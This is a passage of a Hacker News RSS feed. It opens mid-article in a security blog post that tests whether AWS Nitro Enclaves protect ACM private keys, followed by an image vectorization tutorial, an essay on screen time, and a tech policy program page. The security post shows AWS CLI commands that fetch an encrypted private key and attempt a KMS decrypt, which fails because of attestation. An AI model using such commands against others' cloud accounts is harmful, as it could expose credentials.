<p>In the next step, AWS describes we should assign new permissions to our EC2 instance’s IAM role:</p>
<pre><code>{
  "Version": "2012-10-17",
  "Statement": [
    {
        "Effect": "Allow",
        "Action": [
            "s3:GetObject"
        ],
        "Resource": ["arn:aws:s3:::aws-ec2-enclave-certificate-eu-central-1-prod/*"]
    },
    {
        "Effect": "Allow",
        "Action": [
            "kms:Decrypt"
        ],
        "Resource": "arn:aws:kms:eu-central-1:*:key/cb8e3d89-cd82-4560-867c-641c0008fab2"
    }
  ]
}
</code></pre>
<p>These permissions allow our role to fetch an object from the AWS-owned S3 bucket, and to use the AWS-owned KMS key to decrypt data. Let’s update our architecture diagram with these new components.</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/7MJ5bL64JTG0hyNkvSiMhp/485436f06a14e2c4165a4ec00c940209/deployment-2.png?fit=scale&amp;w=1330" alt="Deployment 2"></p>
<h3>Retrieving the file from S3</h3>
<p>The <code>CertificateS3BucketName</code> and <code>CertificateS3ObjectKey</code> clearly identify where the ACM files are stored. Since our IAM Role now has all the necessary permissions, we can try to download the file.</p>
<pre><code>[ec2-user@ip-172-31-42-108 ~]$ aws s3 cp s3://aws-ec2-enclave-certificate-eu-central-1-prod/arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 .
download: s3://aws-ec2-enclave-certificate-eu-central-1-prod/arn:aws:iam::123412341234:role/admin-role/arn:aws:acm:eu-central-1:123412341234:certificate/f2bb1a6e-5704-4702-beb7-a2c3f36e7103 to ./f2bb1a6e-5704-4702-beb7-a2c3f36e7103
</code></pre>
<p>Lo and behold: it worked! We now have the ACM certificate files on our local machine. The million dollar question is what they contain.</p>
<h3>Analyzing the file contents</h3>
<p>We’ll output the file and run it through <code>jq</code>:</p>
<p><img src="https://images.ctfassets.net/9gzi1io5uqx8/XdI3Sa3jYldy7criKPzHb/7ca202e4e65aaec1061f4400ee683073/file-contents.png?fit=scale&amp;w=1330" alt="File Contents"></p>
<p>The contents are in JSON format, with four keys:</p>
<ul>
<li><code>certificate</code></li>
<li><code>certificateChain</code></li>
<li><code>encryptedPrivateKey</code></li>
<li><code>encryptionMethod</code></li>
</ul>
<p>The first two values are unencrypted, but these are the public certificate files anyone visiting <code>vpcdemo.net</code> would receive. No secrets there.</p>
<p>The third value is the private key we’re looking for. Obviously, it’s been encrypted. However, we also got access to a KMS key… Let’s see if we can use that to decrypt this value!</p>
<h3>Decrypting the private key</h3>
<p>First we’ll store the <code>encryptedPrivateKey</code> in a variable: <code>PRIVKEY=$(cat f2bb1a6e-5704-4702-beb7-a2c3f36e7103 | jq -r '.encryptedPrivateKey')</code>.</p>
<p>Then we’ll run the private key through KMS: <code>aws kms --region eu-central-1 decrypt --ciphertext-blob fileb://&lt;(echo $PRIVKEY | base64 -d) --output text --query Plaintext</code>.</p>
<p>Unfortunately, but expectedly, this results in the following output:</p>
<pre><code>An error occurred (AccessDeniedException) when calling the Decrypt operation: The ciphertext refers to a customer master key that does not exist, does not exist in this region, or you are not allowed to access.
</code></pre>
<p>So this doesn’t work. Let’s find out why. We’ll start by looking at CloudTrail. It shows an interesting line:</p>
<pre><code>"errorMessage": "User: arn:aws:sts::123412341234:assumed-role/admin-role/i-025be0b6a191a2cde is not authorized to perform: kms:Decrypt on resource: arn:aws:kms:eu-central-1:194321236082:key/cb8e3d89-cd82-4560-867c-641c0008fab2",
</code></pre>
<p>This shows us that the KMS key is stored in account <code>194321236082</code>, and that our role was not allowed to use it. This is interesting, because we did exactly follow AWS’ instructions, which added permissions for our role to use this KMS key. The answer must lie somewhere in the Nitro Enclaves.</p>
<h3>Running NginX with Nitro Enclaves</h3>
<p>After walking through the last few steps in the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/nitro-enclave-refapp.html#config-nginx">AWS docs</a> we’ve got a running server with HTTPS:</p>
<pre><code>➜  ~ curl -I -XGET https://vpcdemo.net
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Fri, 30 Oct 2020 13:24:26 GMT
Content-Type: text/html
Content-Length: 3520
Last-Modified: Wed, 24 Jun 2020 18:17:11 GMT
Connection: keep-alive
ETag: "5ef398a7-dc0"
Accept-Ranges: bytes
</code></pre>
<p>In the NginX configuration at <code>/etc/pki/nginx/nginx-acm.conf</code> we see the following lines:</p>
<pre><code>ssl_certificate_key "engine:pkcs11:pkcs11:model=p11ne-token;manufacturer=Amazon;token=nginx-acm-token;id=%01;object=acm-key;type=private?pin-value=8c9d293b5fcbe9bc5f70fa400822a936";
ssl_certificate "/run/nitro_enclaves/acm/nginx-cert-6e67696e782d61636d2d746f6b656e.pem";
</code></pre>
<p>So the Nitro Enclave was able to download and decrypt my certificate, even though the parent instance wasn’t. The next question is how AWS has secured their KMS key so the parent instance can’t use it, but the Nitro Enclave using the same IAM Role <em>can</em>.</p>
<h3>Attestation</h3>
<p>The answer can be found in Jeff Barr’s <a rel="noopener noreferrer" href="https://aws.amazon.com/blogs/aws/aws-nitro-enclaves-isolated-ec2-environments-to-process-confidential-data/">blog post</a> and the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/enclaves/latest/user/set-up-attestation.html">Cryptographic attestation</a> chapter in the documentation. When a new enclave image file (the OS and code that runs in the enclave) is created, it will automatically hash its contents in various ways. These are then returned as platform configuration registers (PCRs). There are eight PCRs:</p>
<ul>
<li>PCR[0]: a hash of the enclave image file</li>
<li>PCR[1]: a hash of the Linux kernel and bootstrap</li>
<li>PCR[2]: a hash of the application</li>
<li>PCR[3]: a hash of the IAM role assigned to the parent instance</li>
<li>PCR[4]: a hash of the Instance ID of the parent instance</li>
<li>PCR[8]: a hash of the Enclave image file signing certificate</li>
</ul>
<p>The first one (PCR0) can be used in a KMS condition. From the <a rel="noopener noreferrer" href="https://docs.aws.amazon.com/kms/latest/developerguide/policy-conditions.html">KMS docs</a>:</p>
<blockquote>
<p>The kms:RecipientAttestation:ImageSha384 condition key allows the kms-decrypt, kms-generate-data-key, and kms-generate-random operations from an enclave only when the image hash from the signed attestation document in the request matches the value in the condition key. The ImageSha384 value corresponds to PCR[0] in the attestation document. This condition key is effective only when you call these APIs from an enclave using the Nitro Enclaves SDK.</p>
</blockquote>
<p>And from Jeff Barr’s blog post: “In a real-world environment, I would create a KMS key policy that checks the PCR value as part of a Condition statement:”</p>
<pre><code>"Condition": {
"StringEqualsIgnoreCase": {
 "kms:RecipientAttestation:ImageSha384": "ecfd7aa6d1dcca1e0bba646e7d49ede2761651c68f13cee68b1141c182cd836baae37d05dd8e6260aa847369a7b27e24"
}
</code></pre>
<p>In simple terms: every enclave image has a signature that changes when the content of the enclave image changes. By setting the PCR[0] value at the time the image was built as a condition in KMS, the <code>Decrypt</code> operation will only be allowed when executed by this exact version of the enclave image. When somebody tampers with the image - or tries to use the role from the parent instance as we did above - the PCR0 will change, the KMS condition will no longer match, and access will be denied.</p>
<h3>Conclusion</h3>
<p>In this post we have analyzed the steps AWS …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they">https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they</a></em></p>]]>
            </description>
            <link>https://www.sentiatechblog.com/acm-for-nitro-enclaves-how-secure-are-they</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957128</guid>
            <pubDate>Sun, 01 Nov 2020 03:59:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Simple Image Vectorization]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24957120">thread link</a>) | @thesephist
<br/>
October 31, 2020 | https://wordsandbuttons.online/simple_image_vectorization.html | <a href="https://web.archive.org/web/*/https://wordsandbuttons.online/simple_image_vectorization.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>
Vectorization is when you take some minecraft-style raster image and make a crisp vector picture out of it.
    </p>
    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Bitmap_VS_SVG.svg">
    
    <p>
It's especially useful when you want to turn a satellite photo into a map. Or if you want to scan some blueprint and turn it into a CAD model. Or if you want to reissue an old game and you don't want to redraw all the artwork from scratch.
    </p>
    <p>
The algorithm I'm going to show you has nothing to do with all these things. It's a basic vectorization technique which, in its original form, has little to none applications in the industry.
    </p>
    <p>
On the plus side, it illustrates the approach rather well. It shows how things like bilinear interpolation, gradient descent, and parametric splines work together to solve a real-world problem. At the very least, it makes learning about all these things a little more compelling.
    </p>

    <h2>
An input image
    </h2>
    <p>
A raster image is essentially a rectangular table of things. If it's a full-color RGB, then it's a table of color pixels. Color pixels are the triplets of 8-bit integer values where each value represents an amount of red, green, and blue color.
    </p>
    <p>
Medical images, such as obtained from computed tomography, are usually the tables of 12-bit or 16-bit integers. It's not a color really since the values come from invisible X-ray radiation, but they are called gray values nevertheless.
    </p>
    <p>
Satellite images may have a lot of channels. Apart from the colors of the visible specter they may contain ultra-violet and infra-red luminosity. Channels may be represented by integers or floating point values.
    </p>
    <p>
Our image will be a simple gray-scale bitmap.
    </p>
    <canvas id="greyscale_canvas" width="640" height="640"></canvas>
    <p>
Technically, we can already turn it into vectors rather easily. Let's just agree on some threshold, and mark the contour of all the pixels that have the values exceeding this threshold.
    </p>
    <canvas id="greyscale_canvas_contour" width="640" height="640"></canvas>
    <p>
Well, it's simple, but it's not what we wanted. We want curves, not corners. And for that, we have to make our image less cornery.
    </p>
    <h2>
<span id="index_image_interpolation">Image interpolation</span>
    </h2>
    <p>
Let's say our image is not a table of values. Let's say we only know the values in the centers of the pixels, and we have to guess the values between them somehow.
    </p>
    <p>
This is called interpolation. The simplest case would be the nearest neighbor interpolation, where for every point on an image, the value is the value from the nearest pixel's center. But this simply turns it back into a table.
    </p>
    <p>
A little more advanced is the <span id="index_bilinear_interpolation">bilinear interpolation</span>. The value is the linear sum of the four neighboring values. It looks like this.
    </p>
    <div>
    <pre id="code_1">// pixel value with out of bounds checks
function pixel_in(pixels, i, j) {
    if(i &gt;= pixels.length)
        return pixel_in(pixels, pixels.length-1, j);
    if(i &lt; 0)
        return pixel_in(pixels, 0, j);
    if(j &gt;= pixels[0].length)
        return pixel_in(pixels, i, pixels[0].length-1);
    if(j &lt; 0)
        return pixel_in(pixels, i, 0);
    return pixels[i][j];
}

// linear interpolation
function value_in(pixels, x, y) {
    var j = Math.floor(x - 0.5);
    var tj = x - 0.5 - j;
    var i = Math.floor(y - 0.5);
    var ti = y - 0.5 - i;
    return pixel_in(pixels, i, j) * (1 - ti) * (1 - tj)
         + pixel_in(pixels, i, j+1) * (1 - ti) * (tj)
         + pixel_in(pixels, i+1, j+1) * (ti) * (tj)
         + pixel_in(pixels, i+1, j) * (ti) * (1 - tj);
}
    </pre>
    </div>
    <p>
If we darken the pixels where the interpolated value meets the threshold, we'll get some kind of a contour.
    </p>
    <canvas id="interpolation_canvas" width="640" height="640"></canvas>
    
    <p>
There are other methods. Plenty of them. But linear interpolation solves the cornery border problem just fine. Although, the border we see is just the borderline of some threshold. It's not a vector representation yet.
    </p>

    <h2>
Turning an interpolated image into a contour
    </h2>
    <p>
We can borrow an idea from the <a href="https://wordsandbuttons.online/the_simplest_possible_smooth_contouring_algorithm.html">simplest possible smooth contouring</a> algorithm. We'll build an initial border from the source pixels, and then we'll use our linearly interpolated image to find the best place to put each contour point so the image value will meet the threshold value.
    </p>
    <p>
When you have a <span id="index_distance_field">distance field</span>, it's easy. A distance field is when for any point in space you can tell how far it lies from the surface you want. It's basically a function from point in space to distance.
    </p>
    <p>
You take its gradient, take the difference between the value you have and the threshold value. Since it's the distance field, the value difference is exactly the distance you should move your point for. And the gradient is the exact opposite direction. You just inverse, multiply, add — and you're there.
    </p>
    <p>
Unfortunately, we don't have a distance field. We have a continuous image which only resembles one.
    </p>
    <p>
But the principle still works. If you traverse against the gradient, you will get closer to the threshold value. And the more the difference, the further you have to go. It's just you wouldn't always get there in one try.
    </p>
    <p>
So let's try several times then. Let's make an <a href="https://wordsandbuttons.online/interactive_introduction_to_iterative_algorithms.html">iterative algorithm</a> out of it.
    </p>
    <div>
    <pre id="code_2">// gradient
function gradient(pixels, x, y) {
    const eps = 1e-5;
    return [(value_in(pixels, x + eps, y) - value_in(pixels, x, y)) / eps,
            (value_in(pixels, x, y + eps) - value_in(pixels, x, y)) / eps];
}

// how far should you shift the point to meet the isoline
// if value_in were a distance function
function gradient_shift(pixels, threshold, x, y) {
    var g = gradient(pixels, x, y);
    var g_norm = Math.sqrt(g[0]*g[0] + g[1]*g[1]);
    var d = threshold - value_in(pixels, x, y);
    return [g[0] * d / g_norm / g_norm, g[1] * d / g_norm / g_norm];
}

// brings a point closer to the threshold isoline
function fit_point_better(pixels, threshold, point) {
    const ok_error = 1/255;
    if(Math.abs(value_in(pixels, point[0], point[1]) - threshold) &lt; ok_error)
        return point;
    gs = gradient_shift(pixels, threshold, point[0], point[1])
    var new_point = [point[0] + gs[0], point[1] + gs[1]];
    return fit_point_better(pixels, threshold, new_point);
}
    </pre>
    </div>
    <p>
We'll move our contour points against the gradient until we're close enough to the threshold
    </p>
    <canvas id="fitting_canvas" width="640" height="640"></canvas>
        
    <p>
That's good but we can do better. Let's make the contour smooth.
    </p>

    <h2>
Cubic splines
    </h2>
    <p>
All we have to do to make the contour smooth is to turn each line segment into a parametric cubic curve.
    </p>
    <p>
It's probably sounds more complicated than it is. A parametric cubic curve is just a pair of polynomials. If you have the points and partial derivatives in this points, you can get the coefficients for them from this pair of <a href="https://wordsandbuttons.online/programmers_introduction_to_linear_equations.html">linear systems</a>:
    </p>
    <div><p>
Px(t<sub>1</sub>)' = 3a<sub>x</sub>t<sub>1</sub><sup>2</sup> + 2b<sub>x</sub>t<sub>1</sub> + c = dx<sub>1</sub>/dt
<br>
Px(t<sub>1</sub>) = a<sub>x</sub>t<sub>1</sub><sup>3</sup> + b<sub>x</sub>t<sub>1</sub><sup>2</sup> + c<sub>x</sub>t<sub>1</sub> + d = x<sub>1</sub>
<br>
Px(t<sub>2</sub>) = a<sub>x</sub>t<sub>2</sub><sup>3</sup> + b<sub>x</sub>t<sub>2</sub><sup>2</sup> + c<sub>x</sub>t<sub>2</sub> + d = x<sub>2</sub>
<br>
Px(t<sub>2</sub>)' = 3a<sub>x</sub>t<sub>2</sub><sup>2</sup> + 2b<sub>x</sub>t<sub>2</sub> + c = dx<sub>2</sub>/dt
    </p><p>
    
Py(t<sub>1</sub>)' = 3a<sub>y</sub>t<sub>1</sub><sup>2</sup> + 2b<sub>y</sub>t<sub>1</sub> + c = dy<sub>1</sub>/dt
<br>
Py(t<sub>1</sub>) = a<sub>y</sub>t<sub>1</sub><sup>3</sup> + b<sub>y</sub>t<sub>1</sub><sup>2</sup> + c<sub>y</sub>t<sub>1</sub> + d = y<sub>1</sub>
<br>
Py(t<sub>2</sub>) = a<sub>y</sub>t<sub>2</sub><sup>3</sup> + b<sub>y</sub>t<sub>2</sub><sup>2</sup> + c<sub>y</sub>t<sub>2</sub> + d = y<sub>2</sub>
<br>
Py(t<sub>2</sub>)' = 3a<sub>y</sub>t<sub>2</sub><sup>2</sup> + 2b<sub>y</sub>t<sub>2</sub> + c = dy<sub>2</sub>/dt
    </p></div>
    <p>
The curve itself will then look like this.
    </p>
    <canvas id="cubic_canvas" width="640" height="640"></canvas>
    <p>
Even more, since we get to choose the parameter range, we can make it [0..1]. This greatly simplifies our system and makes it really easy to solve.
    </p>
    <p>
Here is the function that makes one array of polynomial coefficients from two pairs of point and tangent values.
    </p>
    <div>
    <pre id="code_3">// solver specific to [0..1] parametrized splines
function spline_for(p1, p1d, p2, p2d) {
//     A = [
//         [1, 0, 0, 0],
//         [0, 1, 0, 0],
//         [1, 1, 1, 1],
//         [0, 1, 2, 3]];
//     B = [p1, p1d, p2, p2d]
    return [
        p1,
        p1d,
        3*p2 - p2d - 3*p1 - 2*p1d,
        p2d + p1d - 2*p2 + 2*p1
    ];
}
    </pre>
    </div>
    <p>
The polynomial is then computed in every <i>t</i> with this function.
    </p>
    <div>
    <pre id="code_4">// polynomial
function polynomial_in_t(A, t){
    var pt = 0.0;
    for(var i = 0; i &lt; A.length; ++i){
        pt += A[i] * Math.pow(x, i);
    }
    return pt;
}
    </pre>
    </div>
    <p>
So for every line segment with tangents, we can make a parametric polynomial. There is one problem though. We don't have tangents.
    </p>
    <p>
We have the gradient, which is orthogonal to the tangent, but there are two possible tangents in every point. The tangent can be oriented left or right from the gradient.
    </p>
    <p>
But this is solvable. Let's just pick the direction we like and keep it consistent.
    </p>
    <p>
Let the curves that originally come from horizontally oriented segments always have both tangents that way that <i>dx &gt; 0</i>. And the ones that come from vertically oriented segments, will have <i>dy &gt; 0</i>.
    </p>
    <p>
It looks like we have enough parts to assemble an algorithm.
    </p>
    <h2>
Creating splines from the pixels
    </h2>
    <p>
Let's split our vectorization into two parts. First, we'll get points and tangents for every line segment from the pixels. Then we'll turn it all into polynomial splines.
    </p>
    <p>
The function that does the first part looks like this.
    </p>
    <div>
    <pre id="code_5">function turn_pixels_into_points_and_tangents(pixels, threshold) {
    var points = [];
    var tangents = [];

    // "horizontal" pieces
    for(var i = 0; i &lt;= pixels.length; i += 1) {
        var old_point = [];
        var old_tangent = [];
        for(var j = 0; j &lt;= pixels[0].length; j += 1) {
            // if right, left, top, and bottom pixels have a sign change,
            // there should be a spline there
            var sign_change_on_the_right  =
                (pixel_in(pixels, i-1, j+0) - threshold) *
                (pixel_in(pixels, i+0, j+0) - threshold) &lt; 0;
            var sign_change_on_the_left   =
                (pixel_in(pixels, i-1, j-1) - threshold) *
                (pixel_in(pixels, i+0, j-1) - threshold) &lt; 0;
            var sign_change_on_the_bottom =
                (pixel_in(pixels, i+0, j-1) - threshold) *
                (pixel_in(pixels, i+0, j+0) - threshold) &lt; 0;
            var sign_change_on_the_top    =
                (pixel_in(pixels, i-1, j-1) - threshold) *
                …</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wordsandbuttons.online/simple_image_vectorization.html">https://wordsandbuttons.online/simple_image_vectorization.html</a></em></p>]]>
            </description>
            <link>https://wordsandbuttons.online/simple_image_vectorization.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957120</guid>
            <pubDate>Sun, 01 Nov 2020 03:57:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Talk to Yourself]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957116">thread link</a>) | @lettergram
<br/>
October 31, 2020 | https://austingwalters.com/talk-to-yourself/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/talk-to-yourself/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3377">

<div>
<p>If you were born mid-90’s or earlier, you probably remember being bored. We used to talk to ourselves, play “make believe”, taking walks, listening to records, etc. We learned to entertain ourselves, imagine, and create.</p>
<p>Today, my children and children born into the age of the virtual world have not experienced boredom, at least not in the same way. In a sense, those who grew up in the 24-hour news cycle, with social media have never and will never experience being alone. They’ve rarely experience the <a href="https://austingwalters.com/the-last-free-generation/" target="_blank" rel="noopener noreferrer">sense of freedom</a> that comes from thinking to oneself.</p>
<p>A personal concern, is that children’s personalities appear to develop in the absence of technology. They play with toys and make their world come to life. My two year old believes, with all his heart, that his toys are sentient. That our Roomba has feelings and needs to be “fed”. He’s learning reason, learning to manipulate the world, talking to us, and so much more.</p>
<h2>Tools of Gods</h2>
<p>Throughout all human history technology has been an extension of ourselves. Part of childhood is learning to use and create tools. However, today we don’t need to build tools. With phones, we have near infinite information, entertainment, and communication at our finger tips, we can connect to anyone or anything – instantly. Capture audio, video and picture with a tap. Search our memories with a voice command. Calculate any/all the math equations we can think of, etc. Our technology makes us ever more godlike.</p>
<p>To provide this godlike device to a child is irresponsible. Arguably, even in hands of adults, our devices do more harm than good.</p>
<p>The difference between adults and children, is that children need to <em>learn-to-learn</em>. It’s the most important thing a child can learn. How well a child <em>learns-to-learn </em>will shape their entire life, their potential is defined by how well they can learn. There are several important lessons in learning how to learn:</p>
<ul>
<li>Learning to self-reflect</li>
<li>Nurturing curiosity</li>
<li>Defining ones goals</li>
<li>Indexing knowledge</li>
<li>Finding motivation</li>
</ul>
<p>There is probably more than goes into learning-to-learn, but that’s a good list for now.</p>
<p>For me, a defining moment was learning to sculpt my character in an effort to find motivation. I spent quite a bit of time reflecting on who I was and who I wanted to be. I defined myself and found the motivation I needed, with constant self-reflection to change. Without my time riding bikes, running, playing in the woods, soccer, walking alone, I wouldn’t be who I am today.</p>
<h2>Empathy is Derived from Self</h2>
<p>Having a godlike tool able solve most problems is a double edge sward. A phone is addictive by design. Mobile phones track us and companies learn everything about us, with that information being weaponized against us to maximize “screen time”. Is social media useful? Quite frankly, I’d argue no, social media has a net negative effect. Importantly, social media and games on your mobile device keep you constantly stimulated and often push others agenda(s)[<a href="https://www.pnas.org/content/111/24/8788.full" target="_blank" rel="noopener noreferrer">1</a>].</p>
<p>I question if most of the newer generations, born into their environment, have really learned to live in the physical world. Has the newer generation(s) learned to live with and identify themselves? Is there self-reflection and growth? Without an internal dialog, a lot of things break down: personality, autonomy, comfort with being alone, understanding alternative viewpoints… empathy.</p>
<p>Perhaps, [even more concerning] without an internal identity / dialog one doesn’t develop a “classic” ego. If a self-image is typically defined by an internal image and that internal image doesn’t develop, what guides us? Likes? Karma?</p>
<p>This would explain the rise in more extreme moral stances. Such as building a hierarchy based on gender, race, etc. Lack of empathy for others, at the same time garnering more karma, for karma is the value system people can hold themselves to. We no longer need to contemplate who we want to be, because we can receive instant feedback on our actions.</p>
<p>Unfortunately, I suspect this optimizes for short-term gain, but long-term loss to society.</p>
<p>We’ve seen the start of the incredibly destructive cycle, where contemplating or a nuanced opinion is simply not acceptable, because others can’t relate.</p>
<center><iframe data-lazy-type="iframe" data-src="https://www.youtube.com/embed/2cMYfxOFBBM?start=314" width="560" height="315" frameborder="0" allowfullscreen="allowfullscreen"></iframe></center>
<h2>Who are you?</h2>
<blockquote><p>I am free, no matter what rules surround me. If I find them tolerable, I tolerate them; if I find them too obnoxious, I break them. I am free because I know that I alone am morally responsible for everything I do.</p>
<p>– Robert A. Heinlein</p></blockquote>
<p>I’m a firm believer that life is and should be tough. Growth comes from adaptation, confidence is derived from overcoming challenges. When life is tough, you have to create goals and blaze a trail to somewhere better. This is what it means to be “free”, free to have self-determination, which few embrace.</p>
<p>I wasn’t born to my current “class”. I would say, I was born “big-mac” rich, where you could buy a “big-mac” once a month without worrying about budget. My parents provided shelter, food and clothes, but I started mowing lawns at 12 and working a job by 14 to buy anything I needed beyond food and shelter. Yet today, (14 years &amp; a couple kids later), I’d call myself “iPhone” rich, I can buy something of equivalent cost monthly without worrying about it.</p>
<p>This doesn’t happen in a vacuum.</p>
<p>My wife and I regularly create two and five year plans. These goals provide motivation. We can ask ourselves,</p>
<blockquote><p>Does this activity help hit our five year objective?</p></blockquote>
<p>If the answer is no, then it’s probably not worth doing it. We work hard, we reflect regularly and we try to improve; always iterating towards something better.</p>
<p>To have self-determination, people need to think for themselves. They need to contemplate what they want from life. They need to talk to themselves. Self-determination requires goals, it also requires grappling (or ignoring) others and importantly saying “no” and “yes” based on <em>objectives</em> not <em>desires</em>. In the end, this will make people happier.</p>
<p>It all starts with talking to ones-self, spending time alone and deciding what <em>you</em> want.</p>
<h2>A Bleak Outlook</h2>
<p>Unfortunately, the god-like tools we’ve all grown accustom to (especially, when given to kids), seem to disrupt the ability to talk to one-self. In a sense, our phones, media, and general virtual world has taken all our time; this leaves us without time for self-reflection, self-thought, self-actualization. In this stunted world, the AI which manipulates our news replaces the ego we once had.</p>
<p>Complex discussions, real empathy, motivation — are going to be something most of us lose. I’m not sure if society is ready for what we created. It’s a mob of people who’ve never experienced real hardship, who’ve learned a social system designed by virtue signaling (aka trying to game the “karma” systems) and not really learning to live in the real world. Then again, these people will be shaping the real world, for better or worse.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/talk-to-yourself/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957116</guid>
            <pubDate>Sun, 01 Nov 2020 03:56:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stanford paper on Covid-19 spread from large Trump rallies [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957094">thread link</a>) | @adamsea
<br/>
October 31, 2020 | https://sebotero.github.io/papers/COVIDrallies_10_30_2000.pdf | <a href="https://web.archive.org/web/*/https://sebotero.github.io/papers/COVIDrallies_10_30_2000.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sebotero.github.io/papers/COVIDrallies_10_30_2000.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957094</guid>
            <pubDate>Sun, 01 Nov 2020 03:51:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tech Executive Leadership Initiative]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24956890">thread link</a>) | @mooreds
<br/>
October 31, 2020 | https://www.aspentechpolicyhub.org/teli/ | <a href="https://web.archive.org/web/*/https://www.aspentechpolicyhub.org/teli/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
						<div>
							
							<div>
								
<div><figure><img loading="lazy" width="1024" height="232" src="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Tech-Executive-Leadership-Initiative-Logo2-1-1024x232.png" alt="" srcset="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Tech-Executive-Leadership-Initiative-Logo2-1-1024x232.png 1024w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Tech-Executive-Leadership-Initiative-Logo2-1-300x68.png 300w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Tech-Executive-Leadership-Initiative-Logo2-1-768x174.png 768w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Tech-Executive-Leadership-Initiative-Logo2-1-1536x348.png 1536w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/Tech-Executive-Leadership-Initiative-Logo2-1-2048x464.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure></div>



<p>A new program that prepares senior technology leaders with the skills critical to government service and public policy</p>



<p>The Tech Executive Leadership Initiative (TELI) is a pilot 8 week skills-building initiative to prepare experienced technology leaders to engage effectively with public sector challenges. The TELI pilot is a collaboration of the <a href="http://www.aspentechpolicyhub.org/">Aspen Tech Policy Hub</a>, <a href="https://ncoc.org/project-redesign/">Project Redesign</a>, and the <a href="https://techtalentproject.org/">Tech Talent Project</a>.</p>



<p>The inaugural leadership training program, which was fully remote in light of the COVID-19 pandemic, began on August 22nd and ran part-time through mid-October 2020. </p>



<p>Read the full press release announcing TELI <a href="https://www.aspeninstitute.org/news/press-release/announcing-new-pilot-tech-executive-leadership-program">here</a>.</p>



		<section>
							<article>
					
										<a title="Aspen Tech Policy Hub" target="_blank" href="https://www.aspentechpolicyhub.org/">
						<div>
							<p><img alt="Aspen Tech Policy Hub Company Base" src="https://www.aspentechpolicyhub.org/wp-content/themes/aspentech-1.0.0/assets/img/aspen-tech-square.jpg"></p>
						</div>
					</a>
					
				</article>
							<article>
					
										<a title="Project Redesign" target="_blank" href="https://ncoc.org/project-redesign/">
						<div>
							<p><img alt="Aspen Tech Policy Hub Company Base" src="https://www.aspentechpolicyhub.org/wp-content/themes/aspentech-1.0.0/assets/img/aspen-tech-square.jpg"></p>
						</div>
					</a>
					
				</article>
							<article>
					
										<a title="Tech Talent Project" target="_blank" href="https://techtalentproject.org/">
						<div>
							<p><img alt="Aspen Tech Policy Hub Company Base" src="https://www.aspentechpolicyhub.org/wp-content/themes/aspentech-1.0.0/assets/img/aspen-tech-square.jpg"></p>
						</div>
					</a>
					
				</article>
			 
			</section>
			
		
	


		</div></div></div><div><div><div>

 	


<h2>The Curriculum</h2>



<p>TELI provides senior technology professionals with a unique leadership opportunity to build their executive skills through real-world engagement with government, policy, and human-centered design. Through experiential learning with real service delivery challenges, leaders hone their skills to work effectively with dedicated public servants and mitigate risk on technology projects.&nbsp;&nbsp;</p>



<p>As part of the curriculum, leaders also develop innovative, practical projects to real policy and service delivery challenges that governments are facing. Stay tuned to learn more about these projects.</p>



<h2>Our Leaders</h2>



<p>TELI participants include senior leaders from well-known tech advocacy organizations, non-profit organizations, and private companies; entrepreneurial executives who have built and grown successful startups; and innovators who have led digital transformation efforts at large organizations on their own path to modernization.</p>











<div>
<div>
<figure><img loading="lazy" src="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/CCB21262-59E5-493F-AB83-7BCBBBEEE5F3-300x290.png" alt="" width="225" height="217" srcset="https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/CCB21262-59E5-493F-AB83-7BCBBBEEE5F3-300x290.png 300w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/CCB21262-59E5-493F-AB83-7BCBBBEEE5F3-1024x991.png 1024w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/CCB21262-59E5-493F-AB83-7BCBBBEEE5F3-768x743.png 768w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/CCB21262-59E5-493F-AB83-7BCBBBEEE5F3-1536x1487.png 1536w, https://www.aspentechpolicyhub.org/wp-content/uploads/2020/10/CCB21262-59E5-493F-AB83-7BCBBBEEE5F3-2048x1983.png 2048w" sizes="(max-width: 225px) 100vw, 225px"></figure>
</div>



<div>
